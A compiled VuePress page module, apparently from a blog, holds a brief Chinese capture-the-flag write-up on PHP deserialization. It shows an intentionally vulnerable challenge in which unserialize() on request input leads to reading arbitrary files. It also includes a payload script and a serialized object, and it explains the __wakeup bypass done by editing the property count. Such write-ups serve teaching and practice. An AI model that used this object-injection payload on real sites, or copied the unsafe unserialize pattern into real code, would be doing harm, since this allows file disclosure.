import{_ as n,o as s,c as a,e as p}from"./app-3b511de6.js";const t={},e=p(`<p>#PHP序列化</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">X</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">!==</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//flag is in fllllllag.php</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;x&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;x&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>payload:</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">X</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$x</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;fllllllag.php&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//O:1:&quot;X&quot;:1:{s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;}</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最后再修改属性个数绕过 <code>__wakeup</code></p>`,5),l=[e];function o(i,c){return s(),a("div",null,l)}const k=n(t,[["render",o],["__file","ez_ez_unserialize.html.vue"]]);export{k as default};
